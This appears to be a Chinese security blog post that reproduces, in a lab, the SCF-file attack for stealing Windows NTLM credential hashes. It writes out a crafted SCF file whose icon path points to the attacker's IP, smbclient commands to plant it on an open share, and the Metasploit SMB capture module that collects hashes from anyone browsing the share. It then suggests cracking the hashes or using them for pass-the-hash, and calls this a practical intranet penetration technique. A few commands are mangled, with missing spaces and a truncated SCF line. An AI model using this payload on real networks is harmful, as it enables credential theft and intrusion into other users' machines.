 

## 0x00前言

今天国外安全研究人员公布了一个通过SCF文件使用NTLM身份验证中的错误来偷取远程服务器的Window NTLM，该漏洞现在已被公开，通过下载微软的补丁可以解决，其补丁下载地址：https://portal.msrc.microsoft.com/en-us/security-guidance/releasenotedetail/313ae481-3088-e711-80e2-000d3a32fc99，这里我简单的复现了该漏洞利用情况！

## 0x01漏洞复现

**漏洞原理**

该漏洞通过向网络中的共享目录中上传特殊构造的SCF文件(即在SCF文件中将图标文件指定到我们攻击机伪造的共享目录里)，故当任何用户访问该共享目录时便可获取它的Windows NTLM Hash，从而可以进一步破解Hash获得明文密码或者利用Pass The Hash攻击目标服务器，这是一个非常简单且实用的内网渗透技巧。

**实验环境**

**攻击机：10.0.0.86(Kali)**

**目标机/局域网主机B (文件共享主机)：10.0.0.21 (Windows 7 64 bits)**

**局域网主机A(受害主机）：10.0.0.201 (Windows 7 32 bits)**

**具体步骤：**

1、首先在目标机上创建一个共享文件夹,并赋予everyone为可读可写权限（例如：share）

![](http://upload-images.jianshu.io/upload_images/8689220-f514b7e968fcfd93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![](http://upload-images.jianshu.io/upload_images/8689220-a34d7f0f42a411b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![](http://upload-images.jianshu.io/upload_images/8689220-85b4e150cbdde93e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

2.然后关闭共享的密码保护如下：
![](http://upload-images.jianshu.io/upload_images/8689220-c2affa8032abf307.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

3、接下来在攻击机kali上创建一个SCF文件，命令如下：

vimtest.scf

[Shell]

Command=2

IconFile=\\10.0.0.86\share\test.ico

[Taskbar]

Command=ToggleDeskto
![](http://upload-images.jianshu.io/upload_images/8689220-44df702280779cc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

注意：其中的10.0.0.86是指向我们的攻击机。

4、上传上面构造的SCF文件至目标服务器的共享目录里：

root@backlion:/tmp# smbclient//10.0.0.21/share

Enter root's password:

smb: \> puttest.scf

putting file test.scf as \test.scf (2.7 kb/s) (average2.7 kb/s)

smb: \>

![](http://upload-images.jianshu.io/upload_images/8689220-4a9dc1a4d81c0385.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


5、在攻击机上开启MSF的auxiliary/server/capture/smb模块来伪造共享目录并抓取用户的Windows密码Hash：

msf > use auxiliary/server/capture/smb

msf auxiliary(smb) > show options

msf auxiliary(smb) > set JoHNPWFILE /tmp/smbhash.txt

msf auxiliary(smb) > exploit-j

![](http://upload-images.jianshu.io/upload_images/8689220-c5bd541b26590b32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


6、此时任何访问下面目标机上的共享目录的Windows用户的密码Hash都将可能被我们的攻击机获取到。

\\10.0.0.21\share

![](http://upload-images.jianshu.io/upload_images/8689220-45cfb3440f23268a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


局域网主机A：(10.0.0.201/win7_32)



7、在攻击机上我们也“如愿地”偷取到了这三个来自不同windows主机的用户的Windows密码Hash：

![](http://upload-images.jianshu.io/upload_images/8689220-2e648b3ef45d504b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


8、所有获取到的NTLM Hash保存在/tmp/smbhashes.txt_netntlmv2，如下：

![](http://upload-images.jianshu.io/upload_images/8689220-b2a5e3cc998b4e64.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


9、最后，我们可以通过John the Ripper或者其他在线Windows

Hash破解网站，来破解明文密码或者利用NTLM Hash来Pass

The Hash攻击
![](http://upload-images.jianshu.io/upload_images/8689220-b14bf9664c8b3357.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


## 0x02参考

http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/

https://room362.com/post/2016/smb-http-auth-capture-via-scf/
